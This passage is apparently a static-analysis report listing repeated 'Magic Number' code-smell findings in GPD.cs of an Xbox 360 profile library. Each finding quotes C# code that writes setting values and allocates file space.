xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: xRef.xIO.Position += 4;  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: xRef.xIO.Position += 7;  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: switch (ContentType) {  case SettingType.Context:  case SettingType.Binary:  	{  		byte[] xIn = (byte[])xdata;  		int currentsize = (0x18 + xIn.Length);  		if (currentsize < xSize)  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  		else if (currentsize > xSize) {  			int pos = xRef.AllocateData (currentsize);  			if (pos == -1)  				return false;  			xRef.xIO.Position = pos + xRef.HeaderSize;  			xRef.xIO.Write (xSettingID);  			xRef.xIO.Write (new byte[4]);  			xRef.xIO.Write (xContentID);  			xRef.xIO.Write (new byte[7]);  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  			xOffset = pos;  		}  		xSize = currentsize;  		xRef.xIO.Write (((byte[])xdata).Length);  		xRef.xIO.Write (Var2);  		xRef.xIO.Write ((byte[])xdata);  		xRef.xIO.Flush ();  	}  	break;  case SettingType.Unicode:  	{  		string xIn = (string)xdata;  		int stringlen = ((xIn.Length + 1) * 2);  		int currentsize = (0x18 + stringlen);  		if (currentsize < xSize)  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  		else if (currentsize > xSize) {  			int pos = xRef.AllocateData (currentsize);  			if (pos == -1)  				return false;  			xRef.xIO.Position = pos + xRef.HeaderSize;  			xRef.xIO.Write (xSettingID);  			xRef.xIO.Write (new byte[4]);  			xRef.xIO.Write (xContentID);  			xRef.xIO.Write (new byte[7]);  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  			xOffset = pos;  		}  		xSize = currentsize;  		xRef.xIO.Write (stringlen);  		xRef.xIO.Write (Var2);  		xRef.xIO.Write ((string)xdata' StringForm.Unicode);  		xRef.xIO.Write ((short)0);  		xRef.xIO.Flush ();  	}  	break;  case SettingType.DateTime:  	xRef.xIO.Write ((long)xdata);  	xRef.xIO.Flush ();  	return true;  case SettingType.Float:  	xRef.xIO.Write ((float)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.Double:  	xRef.xIO.Write ((double)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.UInt32:  	if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  		xRef.xIO.Write ((uint)xdata);  	else  		xRef.xIO.Write ((int)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.Int64:  	xRef.xIO.Write ((long)xdata);  	xRef.xIO.Flush ();  	break;  default:  	return true;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: switch (ContentType) {  case SettingType.Context:  case SettingType.Binary:  	{  		byte[] xIn = (byte[])xdata;  		int currentsize = (0x18 + xIn.Length);  		if (currentsize < xSize)  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  		else if (currentsize > xSize) {  			int pos = xRef.AllocateData (currentsize);  			if (pos == -1)  				return false;  			xRef.xIO.Position = pos + xRef.HeaderSize;  			xRef.xIO.Write (xSettingID);  			xRef.xIO.Write (new byte[4]);  			xRef.xIO.Write (xContentID);  			xRef.xIO.Write (new byte[7]);  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  			xOffset = pos;  		}  		xSize = currentsize;  		xRef.xIO.Write (((byte[])xdata).Length);  		xRef.xIO.Write (Var2);  		xRef.xIO.Write ((byte[])xdata);  		xRef.xIO.Flush ();  	}  	break;  case SettingType.Unicode:  	{  		string xIn = (string)xdata;  		int stringlen = ((xIn.Length + 1) * 2);  		int currentsize = (0x18 + stringlen);  		if (currentsize < xSize)  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  		else if (currentsize > xSize) {  			int pos = xRef.AllocateData (currentsize);  			if (pos == -1)  				return false;  			xRef.xIO.Position = pos + xRef.HeaderSize;  			xRef.xIO.Write (xSettingID);  			xRef.xIO.Write (new byte[4]);  			xRef.xIO.Write (xContentID);  			xRef.xIO.Write (new byte[7]);  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  			xOffset = pos;  		}  		xSize = currentsize;  		xRef.xIO.Write (stringlen);  		xRef.xIO.Write (Var2);  		xRef.xIO.Write ((string)xdata' StringForm.Unicode);  		xRef.xIO.Write ((short)0);  		xRef.xIO.Flush ();  	}  	break;  case SettingType.DateTime:  	xRef.xIO.Write ((long)xdata);  	xRef.xIO.Flush ();  	return true;  case SettingType.Float:  	xRef.xIO.Write ((float)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.Double:  	xRef.xIO.Write ((double)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.UInt32:  	if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  		xRef.xIO.Write ((uint)xdata);  	else  		xRef.xIO.Write ((int)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.Int64:  	xRef.xIO.Write ((long)xdata);  	xRef.xIO.Flush ();  	break;  default:  	return true;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: switch (ContentType) {  case SettingType.Context:  case SettingType.Binary:  	{  		byte[] xIn = (byte[])xdata;  		int currentsize = (0x18 + xIn.Length);  		if (currentsize < xSize)  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  		else if (currentsize > xSize) {  			int pos = xRef.AllocateData (currentsize);  			if (pos == -1)  				return false;  			xRef.xIO.Position = pos + xRef.HeaderSize;  			xRef.xIO.Write (xSettingID);  			xRef.xIO.Write (new byte[4]);  			xRef.xIO.Write (xContentID);  			xRef.xIO.Write (new byte[7]);  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  			xOffset = pos;  		}  		xSize = currentsize;  		xRef.xIO.Write (((byte[])xdata).Length);  		xRef.xIO.Write (Var2);  		xRef.xIO.Write ((byte[])xdata);  		xRef.xIO.Flush ();  	}  	break;  case SettingType.Unicode:  	{  		string xIn = (string)xdata;  		int stringlen = ((xIn.Length + 1) * 2);  		int currentsize = (0x18 + stringlen);  		if (currentsize < xSize)  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  		else if (currentsize > xSize) {  			int pos = xRef.AllocateData (currentsize);  			if (pos == -1)  				return false;  			xRef.xIO.Position = pos + xRef.HeaderSize;  			xRef.xIO.Write (xSettingID);  			xRef.xIO.Write (new byte[4]);  			xRef.xIO.Write (xContentID);  			xRef.xIO.Write (new byte[7]);  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  			xOffset = pos;  		}  		xSize = currentsize;  		xRef.xIO.Write (stringlen);  		xRef.xIO.Write (Var2);  		xRef.xIO.Write ((string)xdata' StringForm.Unicode);  		xRef.xIO.Write ((short)0);  		xRef.xIO.Flush ();  	}  	break;  case SettingType.DateTime:  	xRef.xIO.Write ((long)xdata);  	xRef.xIO.Flush ();  	return true;  case SettingType.Float:  	xRef.xIO.Write ((float)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.Double:  	xRef.xIO.Write ((double)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.UInt32:  	if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  		xRef.xIO.Write ((uint)xdata);  	else  		xRef.xIO.Write ((int)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.Int64:  	xRef.xIO.Write ((long)xdata);  	xRef.xIO.Flush ();  	break;  default:  	return true;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: switch (ContentType) {  case SettingType.Context:  case SettingType.Binary:  	{  		byte[] xIn = (byte[])xdata;  		int currentsize = (0x18 + xIn.Length);  		if (currentsize < xSize)  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  		else if (currentsize > xSize) {  			int pos = xRef.AllocateData (currentsize);  			if (pos == -1)  				return false;  			xRef.xIO.Position = pos + xRef.HeaderSize;  			xRef.xIO.Write (xSettingID);  			xRef.xIO.Write (new byte[4]);  			xRef.xIO.Write (xContentID);  			xRef.xIO.Write (new byte[7]);  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  			xOffset = pos;  		}  		xSize = currentsize;  		xRef.xIO.Write (((byte[])xdata).Length);  		xRef.xIO.Write (Var2);  		xRef.xIO.Write ((byte[])xdata);  		xRef.xIO.Flush ();  	}  	break;  case SettingType.Unicode:  	{  		string xIn = (string)xdata;  		int stringlen = ((xIn.Length + 1) * 2);  		int currentsize = (0x18 + stringlen);  		if (currentsize < xSize)  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  		else if (currentsize > xSize) {  			int pos = xRef.AllocateData (currentsize);  			if (pos == -1)  				return false;  			xRef.xIO.Position = pos + xRef.HeaderSize;  			xRef.xIO.Write (xSettingID);  			xRef.xIO.Write (new byte[4]);  			xRef.xIO.Write (xContentID);  			xRef.xIO.Write (new byte[7]);  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  			xOffset = pos;  		}  		xSize = currentsize;  		xRef.xIO.Write (stringlen);  		xRef.xIO.Write (Var2);  		xRef.xIO.Write ((string)xdata' StringForm.Unicode);  		xRef.xIO.Write ((short)0);  		xRef.xIO.Flush ();  	}  	break;  case SettingType.DateTime:  	xRef.xIO.Write ((long)xdata);  	xRef.xIO.Flush ();  	return true;  case SettingType.Float:  	xRef.xIO.Write ((float)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.Double:  	xRef.xIO.Write ((double)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.UInt32:  	if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  		xRef.xIO.Write ((uint)xdata);  	else  		xRef.xIO.Write ((int)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.Int64:  	xRef.xIO.Write ((long)xdata);  	xRef.xIO.Flush ();  	break;  default:  	return true;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: switch (ContentType) {  case SettingType.Context:  case SettingType.Binary:  	{  		byte[] xIn = (byte[])xdata;  		int currentsize = (0x18 + xIn.Length);  		if (currentsize < xSize)  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  		else if (currentsize > xSize) {  			int pos = xRef.AllocateData (currentsize);  			if (pos == -1)  				return false;  			xRef.xIO.Position = pos + xRef.HeaderSize;  			xRef.xIO.Write (xSettingID);  			xRef.xIO.Write (new byte[4]);  			xRef.xIO.Write (xContentID);  			xRef.xIO.Write (new byte[7]);  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  			xOffset = pos;  		}  		xSize = currentsize;  		xRef.xIO.Write (((byte[])xdata).Length);  		xRef.xIO.Write (Var2);  		xRef.xIO.Write ((byte[])xdata);  		xRef.xIO.Flush ();  	}  	break;  case SettingType.Unicode:  	{  		string xIn = (string)xdata;  		int stringlen = ((xIn.Length + 1) * 2);  		int currentsize = (0x18 + stringlen);  		if (currentsize < xSize)  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  		else if (currentsize > xSize) {  			int pos = xRef.AllocateData (currentsize);  			if (pos == -1)  				return false;  			xRef.xIO.Position = pos + xRef.HeaderSize;  			xRef.xIO.Write (xSettingID);  			xRef.xIO.Write (new byte[4]);  			xRef.xIO.Write (xContentID);  			xRef.xIO.Write (new byte[7]);  			xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  			xOffset = pos;  		}  		xSize = currentsize;  		xRef.xIO.Write (stringlen);  		xRef.xIO.Write (Var2);  		xRef.xIO.Write ((string)xdata' StringForm.Unicode);  		xRef.xIO.Write ((short)0);  		xRef.xIO.Flush ();  	}  	break;  case SettingType.DateTime:  	xRef.xIO.Write ((long)xdata);  	xRef.xIO.Flush ();  	return true;  case SettingType.Float:  	xRef.xIO.Write ((float)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.Double:  	xRef.xIO.Write ((double)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.UInt32:  	if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  		xRef.xIO.Write ((uint)xdata);  	else  		xRef.xIO.Write ((int)xdata);  	xRef.xIO.Flush ();  	break;  case SettingType.Int64:  	xRef.xIO.Write ((long)xdata);  	xRef.xIO.Flush ();  	break;  default:  	return true;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: if (currentsize < xSize)  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  else if (currentsize > xSize) {  	int pos = xRef.AllocateData (currentsize);  	if (pos == -1)  		return false;  	xRef.xIO.Position = pos + xRef.HeaderSize;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Write (new byte[4]);  	xRef.xIO.Write (xContentID);  	xRef.xIO.Write (new byte[7]);  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  	xOffset = pos;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: if (currentsize < xSize)  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  else if (currentsize > xSize) {  	int pos = xRef.AllocateData (currentsize);  	if (pos == -1)  		return false;  	xRef.xIO.Position = pos + xRef.HeaderSize;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Write (new byte[4]);  	xRef.xIO.Write (xContentID);  	xRef.xIO.Write (new byte[7]);  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  	xOffset = pos;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: if (currentsize > xSize) {  	int pos = xRef.AllocateData (currentsize);  	if (pos == -1)  		return false;  	xRef.xIO.Position = pos + xRef.HeaderSize;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Write (new byte[4]);  	xRef.xIO.Write (xContentID);  	xRef.xIO.Write (new byte[7]);  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  	xOffset = pos;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: if (currentsize > xSize) {  	int pos = xRef.AllocateData (currentsize);  	if (pos == -1)  		return false;  	xRef.xIO.Position = pos + xRef.HeaderSize;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Write (new byte[4]);  	xRef.xIO.Write (xContentID);  	xRef.xIO.Write (new byte[7]);  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  	xOffset = pos;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: xRef.xIO.Write (new byte[4]);  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: xRef.xIO.Write (new byte[7]);  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: if (currentsize < xSize)  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  else if (currentsize > xSize) {  	int pos = xRef.AllocateData (currentsize);  	if (pos == -1)  		return false;  	xRef.xIO.Position = pos + xRef.HeaderSize;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Write (new byte[4]);  	xRef.xIO.Write (xContentID);  	xRef.xIO.Write (new byte[7]);  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  	xOffset = pos;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: if (currentsize < xSize)  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  else if (currentsize > xSize) {  	int pos = xRef.AllocateData (currentsize);  	if (pos == -1)  		return false;  	xRef.xIO.Position = pos + xRef.HeaderSize;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Write (new byte[4]);  	xRef.xIO.Write (xContentID);  	xRef.xIO.Write (new byte[7]);  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  	xOffset = pos;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: if (currentsize > xSize) {  	int pos = xRef.AllocateData (currentsize);  	if (pos == -1)  		return false;  	xRef.xIO.Position = pos + xRef.HeaderSize;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Write (new byte[4]);  	xRef.xIO.Write (xContentID);  	xRef.xIO.Write (new byte[7]);  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  	xOffset = pos;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: if (currentsize > xSize) {  	int pos = xRef.AllocateData (currentsize);  	if (pos == -1)  		return false;  	xRef.xIO.Position = pos + xRef.HeaderSize;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Write (new byte[4]);  	xRef.xIO.Write (xContentID);  	xRef.xIO.Write (new byte[7]);  	xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  	xOffset = pos;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: xRef.xIO.Write (new byte[4]);  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: xRef.xIO.Write (new byte[7]);  
Magic Number,X360.Profile,StringEntry,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadString,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	Data = xRef.xIO.ReadString (StringForm.Unicode' Size / 2);  	xLoaded = true;  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,StringEntry,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadString,The following statement contains a magic number: Data = xRef.xIO.ReadString (StringForm.Unicode' Size / 2);  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,GPD,The following statement contains a magic number: xIO.Position += 4;  
